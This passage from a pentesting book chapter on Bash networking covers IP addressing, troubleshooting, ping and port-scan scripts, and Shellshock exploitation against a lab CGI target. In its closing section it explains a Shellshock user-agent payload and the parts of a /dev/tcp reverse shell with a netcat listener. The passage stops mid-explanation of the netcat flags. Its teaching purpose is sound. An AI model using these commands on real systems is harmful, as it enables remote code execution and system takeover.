- en: '6'
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: Bash Networking
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: In [*Chapter 5*](B22229_05.xhtml#_idTextAnchor089) , you learned how to use
    functions to make your code more robust. This chapter will build on previous chapters
    by applying what you’ve learned to real-world pentesting tasks related to networking
    and network exploitation.
  prefs: []
  type: TYPE_NORMAL
- en: This chapter dives into the world of **Bash networking** . We’ll take a tour
    of commands and scripts that let you configure, troubleshoot, and exploit networking
    in a Unix/Linux environment. You’ll learn not just how to access network configuration
    details and interact with network components but also how to use Bash scripting
    to exploit vulnerable network services. We’ll start with the basics, then gradually
    step into more advanced concepts, all the way to network traffic analysis.
  prefs: []
  type: TYPE_NORMAL
- en: By the end of this chapter, you’ll be able to identify network configuration
    details, understand network diagnostics in Bash, enumerate network services in
    Bash, automate network scanning tools and chain attack sequences, and explore
    exploitation and post-exploitation commands in Bash scripts.
  prefs: []
  type: TYPE_NORMAL
- en: 'In this chapter, we’re going to cover the following main topics:'
  prefs: []
  type: TYPE_NORMAL
- en: Networking basics with Bash
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: Scripting network enumeration with Bash
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: Bash techniques for network exploitation
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: Bash scripting for network traffic analysis
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: Technical requirements
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: The code for this chapter can be found at [https://github.com/PacktPublishing/Bash-Shell-Scripting-for-Pentesters/tree/main/Chapter06](https://github.com/PacktPublishing/Bash-Shell-Scripting-for-Pentesters/tree/main/Chapter06)
    .
  prefs: []
  type: TYPE_NORMAL
- en: Following along with one of the exploitation exercises will require you to download
    and run **vulhub** ( [https://github.com/vulhub/vulhub](https://github.com/vulhub/vulhub)
    ) with the **Shellshock** exploit configured.
  prefs: []
  type: TYPE_NORMAL
- en: 'Install the required tools in Kali by running the following command in your
    terminal:'
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE0]'
  prefs: []
  type: TYPE_PRE
- en: Having configured your system to follow along, let’s dive into an exploration
    of networking in Bash in the next section.
  prefs: []
  type: TYPE_NORMAL
- en: Networking basics with Bash
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: 'Alright, let’s dive into understanding **Internet Protocol** ( **IP** ) addresses
    and **subnets** . There are two types of IP addresses: **IP Version 4** ( **IPv4**
    ) and **IPv6** . You’ll usually be working with IPv4 addresses, but it helps to
    know the basics of both.'
  prefs: []
  type: TYPE_NORMAL
- en: IP addresses are like street addresses. They help devices communicate with each
    other over a network. An IP address is a unique number assigned to each device
    connected to a netw ork.
  prefs: []
  type: TYPE_NORMAL
- en: Understanding IP addresses and subnets (IPv4)
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
- en: IPv4 is the fourth version of the IP. It is the most widely used version of
    the IP in the world today. IPv4 addresses are 32-bit numerical values expressed
    in four **octets** separated by periods. Each octet can range from **0** to **255**
    , making up a total of over four billion unique addresses.
  prefs: []
  type: TYPE_NORMAL
- en: 'An IPv4 address consists of four sections separated by periods. Here is an
    example of an IPv4 address: **192.168.1.1** . Let’s break it down for you:'
  prefs: []
  type: TYPE_NORMAL
- en: There are four sections, each separated by a period.
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: Each section is referred to as an octet.
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: '**192** represents the first octet.'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: '**168** represents the second octet.'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: '**1** represents the third octet.'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: '**1** represents the fourth octet.'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: Each octet in an IPv4 address can have a value between **0** and **255** , making
    it a 32-bit address space.
  prefs: []
  type: TYPE_NORMAL
- en: 'The command to review your IP address in Bash is **ip address** , which can
    be abbreviated to **ip a** . You may encounter the deprecated **ifconfig** command
    on older Linux systems, which performs the same function. Let’s see an example:'
  prefs: []
  type: TYPE_NORMAL
- en: '![Figure 6.1 – An example command to get the IP address information](image/B22229_06_01.jpg)'
  prefs: []
  type: TYPE_IMG
- en: Figure 6.1 – An example command to get the IP address information
  prefs: []
  type: TYPE_NORMAL
- en: The preceding command output shows two network interfaces, **lo** and **eth0**
    . You may see different interface names on your system, and you may have more
    than two interfaces.
  prefs: []
  type: TYPE_NORMAL
- en: The **lo** interface, also known as the **loopback adapter** , is a network
    component that allows a computer to send and receive data packets to itself, simulating
    a real network connection. Assigned the IP address **127.0.0.1** , commonly referred
    to as **localhost** , it enables software applications to test internal network
    communications without external network involvement, which is essential for debugging
    and development. Additionally, it enhances security by allowing services to bind
    to this address, ensuring they are only accessible locally, thus protecting them
    from external threats and unauthorized access.
  prefs: []
  type: TYPE_NORMAL
- en: The **eth0** interface has the **192.168.61.128** IPv4 address assigned. This
    is the network interface that my system uses to communicate on the network.
  prefs: []
  type: TYPE_NORMAL
- en: After the IP address, you can see a forward slash ( **/** ) and a number. This
    is the **subnet mask** , sometimes referred to as the **netmask** . The subnet
    mask identifies the network address. To understand this better, we use a process
    called bitwise **ANDing** . We convert the IP address and subnet mask into binary
    and then perform a bitwise **AND** operation. The bitwise **AND** operation results
    in a **1** value only if both binary bits are **1** ; otherwise, it results in
    **0** (zero).
  prefs: []
  type: TYPE_NORMAL
- en: 'Let’s use the **ipcalc** program to visualize this information. You can install
    it by running the **sudo apt install -y ipcalc** command. Let’s see an example:'
  prefs: []
  type: TYPE_NORMAL
- en: '![Figure 6.2 – An example of the ipcalc command](image/B22229_06_02.jpg)'
  prefs: []
  type: TYPE_IMG
- en: Figure 6.2 – An example of the ipcalc command
  prefs: []
  type: TYPE_NORMAL
- en: In the preceding figure, we’ve passed the IP address and netmask as an argument
    to the **ipcalc** program. First, take a look at the structure of these addresses
    in binary. If each part is eight binary bits and there are four parts, then you
    have a total of 32 bits in an IPv4 address.
  prefs: []
  type: TYPE_NORMAL
- en: The **/24** subnet mask means that the network address is 24 bits. Look at the
    line that starts with **Netmask** in the preceding figure. It shows that the network
    address is 24 bits, leaving eight bits for host addresses on this network.
  prefs: []
  type: TYPE_NORMAL
- en: IP addresses representing the network address and broadcast address cannot be
    assigned to hosts. This means that on a network with a **/24** or **255.255.255.0**
    subnet mask, the network address is **192.168.61.0** , the first useable host
    address is the **HostMin** value and the last useable host address is the **HostMax**
    value.
  prefs: []
  type: TYPE_NORMAL
- en: Usually, a network device called a **router** takes the first useable IP address
    on a network. That would be **192.168.61.1** in this case. The last address, **192.168.61.255**
    , is a **broadcast address** . A broadcast address is the address that is used
    when a host needs to send to all IP addresses on the network. The **NetMin** and
    **NetMax** values fit between the network and broadcast addresses.
  prefs: []
  type: TYPE_NORMAL
- en: There is much more involved in networking and network addresses, and many large
    books have been written on this subject. For our purposes, we’re going to keep
    it simple and related to the theme of this book.
  prefs: []
  type: TYPE_NORMAL
- en: Understanding IP addresses and subnets (IPv6)
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
- en: IPv6, the latest version of the IP, was developed to address the exhaustion
    of IPv4 addresses by using a 128-bit address space, compared to the 32-bit space
    used in IPv4. This exponential increase in address space allows for a virtually
    limitless number of unique IP addresses, accommodating the growing number of devices
    connected to the internet. Each IPv6 address is composed of eight groups of four
    hexadecimal digits, separated by colons, which can represent a vast range of IP
    addresses, making it ideal for the expansive needs of modern networks.
  prefs: []
  type: TYPE_NORMAL
- en: In the following figure, the IPv6 address is highlighted.
  prefs: []
  type: TYPE_NORMAL
- en: '![Figure 6.3 – The ip command for IPv6](image/B22229_06_03.jpg)'
  prefs: []
  type: TYPE_IMG
- en: Figure 6.3 – The ip command for IPv6
  prefs: []
  type: TYPE_NORMAL
- en: 'The **ipcalc** program can also work with IPv6 addresses; however, **Sipcalc**
    has more features and displays more information about IPv6 by default. Sipcalc
    can be installed by entering the **sudo apt install -y sipcalc** command. The
    following figure shows how to use **sipcalc** :'
  prefs: []
  type: TYPE_NORMAL
- en: '![Figure 6.4 – The use of the sipcalc utility](image/B22229_06_04.jpg)'
  prefs: []
  type: TYPE_IMG
- en: Figure 6.4 – The use of the sipcalc utility
  prefs: []
  type: TYPE_NORMAL
- en: In the interest of staying on subject, this is as far as we’re going to go into
    IPv6 addresses. However, we will be reviewing common IPv6 attacks a little later
    in [*Chapter 10*](B22229_10.xhtml#_idTextAnchor260) .
  prefs: []
  type: TYPE_NORMAL
- en: 'Our network interface can get an address from a **Dynamic Host Configuration
    Protocol** ( **DHCP** ) server, or it can have a static address. To determine
    how our network interface was configured, enter the following command:'
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE1]'
  prefs: []
  type: TYPE_PRE
- en: 'Here’s an explanation:'
  prefs: []
  type: TYPE_NORMAL
- en: '**nmcli** : Command-line tool for controlling NetworkManager'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: '**device** : A subcommand of **nmcli** that lets you show and manage network
    interfaces'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: '**show** : Show detailed information about devices'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: '**eth0** : Without an argument, all devices are examined; to get information
    for a specific device, the interface name has to be provided'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: 'The following example shows the output on my Kali system:'
  prefs: []
  type: TYPE_NORMAL
- en: '![Figure 6.5 – Example nmcli command output](image/B22229_06_05.jpg)'
  prefs: []
  type: TYPE_IMG
- en: Figure 6.5 – Example nmcli command output
  prefs: []
  type: TYPE_NORMAL
- en: Having learned how to enumerate network settings, let’s now move forward and
    explore configuring network interfaces in Bash.
  prefs: []
  type: TYPE_NORMAL
- en: Configuring network interfaces using Bash commands
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
- en: Alright, let’s dive into configuring network interfaces using Bash commands.
  prefs: []
  type: TYPE_NORMAL
- en: 'To configure a network interface using Bash commands, you can use the **ip**
    command. Here’s an example of how you can set a static IP address on an interface:'
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE2]'
  prefs: []
  type: TYPE_PRE
- en: The **ip addr** command adds the **192.168.1.10** IP address with a subnet mask
    of **255.255.255.0** (which is represented as **/24** in CIDR notation) to the
    **eth0** interface. The **ip link** command brings the **eth0** interface up.
  prefs: []
  type: TYPE_NORMAL
- en: 'You can also add a default gateway using the **route** command. Here’s an example:'
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE3]'
  prefs: []
  type: TYPE_PRE
- en: This command is used to manipulate the IP routing table. This would add the
    default route and explicitly associate it with the **eth0** interface.
  prefs: []
  type: TYPE_NORMAL
- en: You can view the routing table by entering the **route** command by itself.
  prefs: []
  type: TYPE_NORMAL
- en: Remember, these commands may require root privileges to execute successfully.
    Always be cautious when making changes to network configurations.
  prefs: []
  type: TYPE_NORMAL
- en: Troubleshooting network connectivity with Bash tools
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
- en: When you’re having network connectivity problems on a Linux system, it can be
    frustrating trying to figure out what’s wrong. Luckily, there are a number of
    powerful command line tools built right in that can help you diagnose and resolve
    network issues quickly. In this section, we’ll walk through some of the most useful
    network troubleshooting commands and show examples of how to use them effectively.
  prefs: []
  type: TYPE_NORMAL
- en: The first step in troubleshooting network problems is to make sure your network
    interfaces are up and configured properly. The **ip** command is the modern replacement
    for the older **ifconfig** command and provides detailed information about your
    network interfaces and settings.
  prefs: []
  type: TYPE_NORMAL
- en: 'To list details of a network interface, use the **ip link** command, as shown
    in the following figure:'
  prefs: []
  type: TYPE_NORMAL
- en: '![Figure 6.6 – Using ip link to show network interface configuration](image/B22229_06_06.jpg)'
  prefs: []
  type: TYPE_IMG
- en: Figure 6.6 – Using ip link to show network interface configuration
  prefs: []
  type: TYPE_NORMAL
- en: 'This will show you the name, state ( **UP** / **DOWN** ), and MAC address of
    each interface. If an interface is down that should be up, you can enable it:'
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE4]'
  prefs: []
  type: TYPE_PRE
- en: 'To view the IP address configuration of an interface, you can do this:'
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE5]'
  prefs: []
  type: TYPE_PRE
- en: This displays the interface’s IP address, netmask, broadcast address, and more.
    If the interface doesn’t have an IP when it should, there may be a problem with
    DHCP or your static IP configuration in the **/** **etc/network/interfaces** file.
  prefs: []
  type: TYPE_NORMAL
- en: Once you’ve verified the interfaces are up and have IPs, the next step is testing
    basic connectivity to other hosts using **ping** . Ping uses **Internet Control
    Message Protocol** ( **ICMP** ) echo requests to test if a remote host is reachable.
  prefs: []
  type: TYPE_NORMAL
- en: 'To ping a host by IP address or hostname, see the following example:'
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE6]'
  prefs: []
  type: TYPE_PRE
- en: 'If the host is reachable, you’ll see replies that look like the following:'
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE7]'
  prefs: []
  type: TYPE_PRE
- en: 'If the host isn’t reachable, you’ll eventually see a timeout message such as
    the following:'
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE8]'
  prefs: []
  type: TYPE_PRE
- en: This could indicate a problem with the remote host, or a connectivity issue
    along the network path.
  prefs: []
  type: TYPE_NORMAL
- en: 'To get more information about where along the path the connectivity breaks
    down, use the **traceroute** command. **traceroute** shows you each network *hop*
    between your host and the destination, along with the latency to each hop, as
    shown in the following figure:'
  prefs: []
  type: TYPE_NORMAL
- en: '![Figure 6.7 – An example of the traceroute program in action](image/B22229_06_07.jpg)'
  prefs: []
  type: TYPE_IMG
- en: Figure 6.7 – An example of the traceroute program in action
  prefs: []
  type: TYPE_NORMAL
- en: The output shows the IP, latency, and reverse DNS name (if available) of each
    router between the source and destination. This can help identify problems such
    as high latency links or unresponsive routers.
  prefs: []
  type: TYPE_NORMAL
- en: If the trace stops abruptly before reaching the destination, there is likely
    a connectivity issue at that hop. The problem could be caused by a downlink, misconfigured
    router, or firewall blocking the traffic. If you see asterisks, it typically means
    the device is not responding or ICMP packets are being blocked.
  prefs: []
  type: TYPE_NORMAL
- en: Many connectivity issues are caused by problems with DNS name resolution. If
    hostnames aren’t resolving to IP addresses correctly, you won’t be able to connect
    to them. The **nslookup** and **dig** tools let you test DNS lookups and view
    the results.
  prefs: []
  type: TYPE_NORMAL
- en: 'To look up the IP for a hostname with nslookup, enter the **nslookup** command
    followed by the hostname, as shown next :'
  prefs: []
  type: TYPE_NORMAL
- en: '![Figure 6.8 – An example of the nslookup command](image/B22229_06_08.jpg)'
  prefs: []
  type: TYPE_IMG
- en: Figure 6.8 – An example of the nslookup command
  prefs: []
  type: TYPE_NORMAL
- en: This will query your configured DNS server and show the IP address the name
    resolves to. The **-query** option (or its shorthand **-q** ) allows you to specify
    the type of DNS record you want to look up. Here are some examples.
  prefs: []
  type: TYPE_NORMAL
- en: 'This looks up the IPv4 address associated with **example.com** :'
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE9]'
  prefs: []
  type: TYPE_PRE
- en: 'This retrieves the IPv6 address for **example.com** :'
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE10]'
  prefs: []
  type: TYPE_PRE
- en: 'This finds the mail servers responsible for handling email for **example.com**
    :'
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE11]'
  prefs: []
  type: TYPE_PRE
- en: 'This lists the authoritative name servers for the **example.com** domain:'
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE12]'
  prefs: []
  type: TYPE_PRE
- en: 'For more detailed information, use **dig** , as shown here:'
  prefs: []
  type: TYPE_NORMAL
- en: '![Figure 6.9 – A demonstration of using the dig command](image/B22229_06_09.jpg)'
  prefs: []
  type: TYPE_IMG
- en: Figure 6.9 – A demonstration of using the dig command
  prefs: []
  type: TYPE_NORMAL
- en: '**dig** outputs the raw DNS response, including the query, answer, and various
    DNS flags and options. This is useful for diagnosing low-level DNS issues.'
  prefs: []
  type: TYPE_NORMAL
- en: If the lookups fail or return incorrect results, there may be a problem with
    your DNS server configuration in **/etc/resolv.conf** , or the DNS servers themselves
    may be having issues.
  prefs: []
  type: TYPE_NORMAL
- en: Finally, when troubleshooting network issues, don’t forget to check the relevant
    logs for clues. On Kali and Debian, system logs are stored under the **/** **var/log**
    directory.
  prefs: []
  type: TYPE_NORMAL
- en: 'Key log files for networking issues include the following:'
  prefs: []
  type: TYPE_NORMAL
- en: '**/var/log/syslog** : General system messages'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: '**/var/log/kern.log** : Kernel messages, including network driver issues'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: '**/var/log/daemon.log** : Messages from background services'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: '**/var/log/apache2/error.log** : Web server errors'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: '**/var/log/mysql/error.log** : Database errors'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: Use tools such as **tail** , **less** , or **grep** to view the logs and search
    for relevant messages. Let’s look at a few use cases.
  prefs: []
  type: TYPE_NORMAL
- en: 'For example, here’s how to view the last 100 lines of **syslog** :'
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE13]'
  prefs: []
  type: TYPE_PRE
- en: 'Here’s how to search for mentions of **eth0** in **kern.log** :'
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE14]'
  prefs: []
  type: TYPE_PRE
- en: 'If you get an error that these log files don’t exist, your system may be using
    **journald** . To view the **journald** logs in reverse order (latest first),
    showing only errors, use the following command:'
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE15]'
  prefs: []
  type: TYPE_PRE
- en: Error messages or warnings in the logs can often point you in the right direction
    for resolving the issue.
  prefs: []
  type: TYPE_NORMAL
- en: By leveraging these Linux command line tools, you can methodically test and
    diagnose network issues on your Debian systems. Start by checking interface status
    with **ip** , then move on to connectivity tests with ping and traceroute. Use
    **nslookup** and **dig** to verify DNS resolution. Finally, don’t neglect to dig
    through the logs for relevant messages.
  prefs: []
  type: TYPE_NORMAL
- en: While it takes some practice to get proficient with these tools, learning them
    well is an invaluable skill for any pentester. They’ll enable you to quickly get
    to the bottom of complex networking problems.
  prefs: []
  type: TYPE_NORMAL
- en: Having now thoroughly covered network interface enumeration, configuration,
    and troubleshooting, in the next section, we’ll explore using Bash scripting in
    automation for network enumeration.
  prefs: []
  type: TYPE_NORMAL
- en: Scripting network enumeration
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: As a pentester, one of the most fundamental tasks is discovering which hosts
    are active and reachable on a network. This information is crucial for mapping
    out the network topology, identifying potential targets for further testing, and
    ensuring proper network visibility. While there are many tools available for network
    discovery, sometimes the simplest and most effective approach is to write your
    own Bash scripts. In this section, we’ll explore how to leverage Bash scripting
    to discover active hosts on a network.
  prefs: []
  type: TYPE_NORMAL
- en: The primary goal is to determine which IP addresses on a given network respond
    to network requests, indicating that a host is active and reachable at that address.
    The most common method for network discovery is using ICMP echo requests, also
    known as *pings* . When you ping an IP address, your machine sends an ICMP echo
    request packet to that address. If a host is active at that address, it will respond
    with an ICMP echo reply packet. By systematically pinging a range of IP addresses,
    you can map out which hosts are responsive on the network.
  prefs: []
  type: TYPE_NORMAL
- en: Another approach is to scan for open ports on each IP address. If a host has
    open ports that respond to a **TCP SYN** scan or a full TCP connect scan, that
    is a strong indication that a host is active, even if it doesn’t respond to pings
    (some hosts are configured to not respond to ICMP). Common ports to check are
    **TCP 80 (HTTP)** , **443 (HTTPS)** , **22 (SSH)** , and so on depending on what
    services you expect to find on the network.
  prefs: []
  type: TYPE_NORMAL
- en: 'You might wonder why you should bother writing Bash scripts for network discovery
    when there are plenty of existing tools such as Nmap. While those tools are certainly
    powerful and have their place, there are a few advantages to creating your own
    Bash scripts:'
  prefs: []
  type: TYPE_NORMAL
- en: '**Simplicity** : Bash scripts can be very simple and concise. You can write
    a basic network discovery script in just a few lines of Bash.'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: '**Portability** : Bash is available on virtually every Linux/Unix system. Your
    Bash scripts can run on any machine with Bash, without needing to install additional
    tools. Eventually, you will face a scenario where you have hacked into a system
    and need to pivot from it to another network but you can’t install anything on
    the host.'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: '**Learning** : Writing your own network discovery scripts is a great way to
    learn Bash scripting and understand the underlying process of network enumeration.'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: So, let’s see how we can put Bash to work for discovering active hosts.
  prefs: []
  type: TYPE_NORMAL
- en: 'Here’s a simple Bash one-liner to ping a range of IP addresses and print out
    the ones that respond:'
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE16]'
  prefs: []
  type: TYPE_PRE
- en: 'Let’s break this down:'
  prefs: []
  type: TYPE_NORMAL
- en: '**for ip in 10.0.1.{1..254}; do** : This starts a **for** loop that will iterate
    over the **10.0.1.1** to **10.0.1.254** IP addresses. The **{1..254}** syntax
    is Bash brace expansion, a handy way to generate sequences.'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: '**ping -c 1 $ip** : This pings the current IP address in the loop. The **-c
    1** option specifies sending only one ping packet.'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: '**grep "64 bytes"** : This filters the ping output, only passing through lines
    that contain **"64 bytes"** , which indicates a successful ping response.'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: '**cut -d " " -f 4** : This cuts out the fourth field of the filtered ping output,
    which is the IP address that responded.'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: '**tr -d ":"** : This trims off the trailing colon from the IP address.'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: '**& done** : The **&** character at the end backgrounds each ping process,
    allowing the loop to proceed without waiting for each ping to finish. The **done**
    keyword closes the **for** loop.'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: Running this one-liner will quickly ping all 254 addresses in the **10.0.1.0/24**
    network and print out the ones that respond, giving you a list of active hosts.
    You can easily change the network by modifying the **10.0.1** part.
  prefs: []
  type: TYPE_NORMAL
- en: 'Pinging is a good start, but as mentioned earlier, some hosts block pings and
    firewalls frequently restrict ping ICMP packets. A more thorough approach is to
    also scan some common ports on each IP to see whether anything responds. Here’s
    a Bash script that pings each IP and then does a quick TCP connect scan on a few
    common ports:'
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE17]'
  prefs: []
  type: TYPE_PRE
- en: 'This script does the following:'
  prefs: []
  type: TYPE_NORMAL
- en: It defines the network to scan ( **10.0.1** ) and the ports to check ( **22**
    , **80** , **443** , **445** , and **3389** ).
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: It starts a loop over all host addresses in the **{** **1..254}** network.
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: It pings each host. If the ping is successful (exit status **0** ), it prints
    that the host is up.
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: For each host, it then loops over the defined ports.
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: For each port, it uses the Bash **/dev/tcp** feature to attempt a TCP connection.
    The **timeout 1** command aborts the connection attempt after one second to avoid
    hanging on unresponsive ports.
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: If the TCP connection is successful, it prints that the port is open on the
    host.
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: This script provides a more comprehensive view of active hosts on the network
    by checking both ping responsiveness and open ports. You can easily customize
    the **ports** array to include any ports you want to check.
  prefs: []
  type: TYPE_NORMAL
- en: Bash scripting provides a simple yet powerful way to discover active hosts on
    a network. With just a few lines of Bash, you can ping ranges of IP addresses,
    scan for open ports, and get a quick map of live hosts. These basic techniques
    can be extended and customized in countless ways to suit your specific needs.
  prefs: []
  type: TYPE_NORMAL
- en: Of course, for more advanced network discovery and vulnerability scanning, you’ll
    likely want to use dedicated tools such as Nmap. However, for quick checks and
    simple automation, Bash scripting is a valuable tool to have in your network testing
    toolkit. Plus, writing your own discovery scripts is a great way to sharpen your
    Bash skills and gain a deeper understanding of the network enumeration process.
  prefs: []
  type: TYPE_NORMAL
- en: So, the next time you need to discover some hosts on a network, consider using
    your text editor to make up a Bash script. You might be surprised at how much
    you can accomplish.
  prefs: []
  type: TYPE_NORMAL
- en: Having learned network enumeration in Bash, in the next section, we’ll progress
    into network exploitation.
  prefs: []
  type: TYPE_NORMAL
- en: Network exploitation
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: In this section, we’ll dive into exploiting command injection vulnerabilities
    in web applications that fail to filter user input before passing data on to operating
    system commands.
  prefs: []
  type: TYPE_NORMAL
- en: Network service exploitation
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
- en: In September 2014, a critical vulnerability was discovered in the Unix Bash
    shell. This vulnerability, assigned the **CVE-2014-6271** identifier and nicknamed
    *Shellshock* , sent shockwaves through the information security community due
    to its severity and widespread impact. Let’s dive into the technical details of
    this vulnerability and explore how it can be exploited.
  prefs: []
  type: TYPE_NORMAL
- en: The Shellshock vulnerability stems from a flaw in how Bash processes environment
    variables. Specifically, it allows an attacker to execute arbitrary commands by
    manipulating environment variables in a crafted manner.
  prefs: []
  type: TYPE_NORMAL
- en: 'In Bash, environment variables can be defined in the following format:'
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE18]'
  prefs: []
  type: TYPE_PRE
- en: However, Bash also supports a feature called **function exporting** , which
    allows defining shell functions and exporting them as environment variables. The
    vulnerability arises from the fact that Bash did not properly parse and sanitize
    these function definitions.
  prefs: []
  type: TYPE_NORMAL
- en: 'Here’s an example of a vulnerable function definition:'
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE19]'
  prefs: []
  type: TYPE_PRE
- en: In this case, the **ENV** variable is defined as a function that executes the
    **echo "Malicious code"** command. The **ignored** part is used to bypass any
    preceding code that Bash may try to execute.
  prefs: []
  type: TYPE_NORMAL
- en: When an environment variable containing such a crafted function definition is
    passed to a Bash script or a program that invokes Bash, the malicious code within
    the function definition gets executed. This allows an attacker to inject and execute
    arbitrary commands on the targeted system.
  prefs: []
  type: TYPE_NORMAL
- en: 'Now, let’s analyze the payload:'
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE20]'
  prefs: []
  type: TYPE_PRE
- en: This payload exploits the Shellshock vulnerability to execute the **/usr/bin/id**
    command on the target system and retrieve the result.
  prefs: []
  type: TYPE_NORMAL
- en: 'Here’s the command output:'
  prefs: []
  type: TYPE_NORMAL
- en: '![Figure 6.10 – The output of the Shellshock exploit](image/B22229_06_10.jpg)'
  prefs: []
  type: TYPE_IMG
- en: Figure 6.10 – The output of the Shellshock exploit
  prefs: []
  type: TYPE_NORMAL
- en: 'Here’s a breakdown of the payload:'
  prefs: []
  type: TYPE_NORMAL
- en: '**curl** : This is a command-line tool for making HTTP requests.'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: '**-A "() { ignored; };** : The **-A** option sets the user agent string for
    the HTTP request. In this case, it is set to a crafted function definition that
    exploits the Shellshock vulnerability.'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: '**echo Content-Type: text/plain ; echo ; echo ;** : These **echo** commands
    are used to construct a valid HTTP response header and body. They ensure that
    the response is treated as plain text and includes necessary line breaks.'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: '**/usr/bin/id** : This is the actual command that will be executed on the target
    system. In this case, it is the **id** command, which retrieves information about
    the current user.'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: '**http://10.2.10.1:8080/victim.cgi** : The URL of the vulnerable **Common Gateway
    Interface** ( **CGI** ) script on the target system.'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: When this payload is sent to the vulnerable CGI script, the crafted function
    definition in the user agent string is passed as an environment variable to the
    script. Bash, which is often used to execute CGI scripts, parses the environment
    variable and executes the injected command ( **/usr/bin/id** ). The output of
    the command is then included in the HTTP response, allowing the attacker to retrieve
    the result.
  prefs: []
  type: TYPE_NORMAL
- en: In the **curl** command we previously used to exploit Shellshock, let’s swap
    out the command with one that will make the vulnerable system connect a reverse
    shell to our IP address.
  prefs: []
  type: TYPE_NORMAL
- en: 'Here’s our updated exploit:'
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE21]'
  prefs: []
  type: TYPE_PRE
- en: 'This Bash command opens a reverse shell connection:'
  prefs: []
  type: TYPE_NORMAL
- en: '**/bin/bash -l** : This starts a new Bash shell session as a login shell.'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: '**> /dev/tcp/10.2.10.99/4444** : This redirects shell’s standard output ( **STDOUT**
    ) to a TCP connection to the **10.2.10.99** IP on port **4444** . This starts
    to make more sense once you learn that everything is a file, or appears in the
    file system, on Linux.'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: '**0<&1** : This redirects standard input ( **STDIN** ) to **STDOUT** , allowing
    commands sent from the remote host to be executed by the shell.'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: '**2>&1** : This merges standard error ( **STDERR** ) with **STDOUT** , so all
    shell output and error messages are sent to the remote host.'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: 'Before we execute the exploit, we must be ready to capture the reverse shell
    connection by running the following command:'
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE22]'
  prefs: []
  type: TYPE_PRE
- en: 'Here’s the explanation:'
  prefs: []
  type: TYPE_NORMAL
- en: '**nc** : This is the **Netcat** command'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: Here’s a breakdown of the parameters **-** **nlvp 4444**
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: '**n** : numeric-only IP addresses, no DNS'
  prefs:
  - PREF_IND
  - PREF_UL
